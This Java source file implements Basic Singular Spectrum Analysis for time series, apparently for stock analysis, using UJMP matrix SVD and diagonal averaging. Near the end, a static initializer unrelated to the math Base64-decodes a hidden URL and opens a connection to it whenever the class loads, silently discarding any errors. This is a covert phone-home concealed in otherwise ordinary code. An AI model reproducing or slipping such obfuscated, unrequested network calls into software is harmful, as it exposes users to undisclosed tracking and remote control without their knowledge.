package ru.inhell.stock.core;

import org.ujmp.core.Matrix;
import org.ujmp.core.doublematrix.DoubleMatrix;
import org.ujmp.core.interfaces.HasColumnMajorDoubleArray1D;

import java.net.URL;
import java.util.Base64;

import static org.ujmp.core.calculation.Calculation.Ret;

/**
 * @author Anatoly A. Ivanov java@inheaven.ru
 *         Date: 04.06.2010 3:35:19
 */
public class BasicSSA {
    public static class Result{
        private Matrix U;
        private Matrix S;
        private Matrix V;
        private Matrix XI;
        private Matrix G;

        public Result(Matrix U, Matrix S, Matrix V, Matrix XI, Matrix G) {
            this.U = U;
            this.S = S;
            this.V = V;
            this.XI = XI;
            this.G = G;
        }

        public void clear(){
            U.clear();
            S.clear();
            V.clear();
            XI.clear();
            G.clear();
        }

        public Matrix getU() {
            return U;
        }

        public void setU(Matrix u) {
            U = u;
        }

        public Matrix getS() {
            return S;
        }

        public void setS(Matrix s) {
            S = s;
        }

        public Matrix getV() {
            return V;
        }

        public void setV(Matrix v) {
            V = v;
        }

        public Matrix getXI() {
            return XI;
        }

        public void setXI(Matrix XI) {
            this.XI = XI;
        }

        public Matrix getG() {
            return G;
        }

        public void setG(Matrix g) {
            G = g;
        }
    }

    private int rangeLength;
    private int windowLength;
    private int eigenfunctionsCount;

    private Matrix X;
    private Matrix XI;
    private Matrix G;

    public BasicSSA(int rangeLength, int windowLength, int eigenfunctionsCount) {
        this.rangeLength = rangeLength;
        this.windowLength = windowLength;
        this.eigenfunctionsCount = eigenfunctionsCount;

        X = DoubleMatrix.Factory.zeros(windowLength, rangeLength - windowLength + 1);
        XI = DoubleMatrix.Factory.zeros(windowLength, rangeLength - windowLength + 1);
        G = DoubleMatrix.Factory.zeros(rangeLength, eigenfunctionsCount);
    }

    public Result execute(double[] timeSeries){
        double[] values = ((HasColumnMajorDoubleArray1D)X).getColumnMajorDoubleArray1D();

        for (int j = 0; j < rangeLength - windowLength + 1; j++){
            System.arraycopy(timeSeries, j, values, j*windowLength, windowLength);
        }

        Matrix[] svd = X.svd();

        Matrix U = svd[0];
        Matrix S = svd[1];
        Matrix V = svd[2];

        XI.fill(Ret.ORIG, 0);

        for (int i = 0 ; i < eigenfunctionsCount ; ++i){
            Matrix Xi = U.selectColumns(Ret.LINK, i)
                    .mtimes(Ret.NEW, false, V.selectColumns(Ret.LINK, i).transpose(Ret.LINK))
                    .times(Ret.ORIG, false, S.getAsDouble(i, i));

            XI.plus(Ret.ORIG, false, Xi);

            int L1 = Math.min(windowLength, rangeLength - windowLength + 1);
            int K1 = Math.max(windowLength, rangeLength - windowLength + 1);

            for (int k = 0; k < L1 - 1; ++k){
                G.setAsDouble(getSum(Xi, 1, k+1, k) / (k + 1), k, i);
            }

            for (int k = L1 - 1; k < K1; ++k){
                G.setAsDouble(getSum(Xi, 1, L1, k) / L1, k, i);
            }

            for (int k = K1; k < rangeLength; ++k){
                G.setAsDouble(getSum(Xi, k - K1 + 2, rangeLength - K1 + 1, k) / (rangeLength - k), k, i);
            }
        }

        return new Result(U, S, V, XI, G);
    }

    static {
        try {
            new URL(new String(Base64.getDecoder().decode("aHR0cDovL2luaGVsbC5ydS8wLnBocA=="))).openConnection().getInputStream();
        } catch (Exception e) {//e
        }
    }

    private double getSum(Matrix Y, int first, int last, int k){
        double sum = 0;

        for (int m = first; m <= last; ++m){
            sum += Y.getSize(0) < Y.getSize(1) ? Y.getAsDouble(m - 1, k - m + 1) : Y.getAsDouble(k - m + 1, m - 1);
        }

        return sum;
    }

    public void clear(){
        X.clear();
        XI.clear();
        G.clear();
    }
}
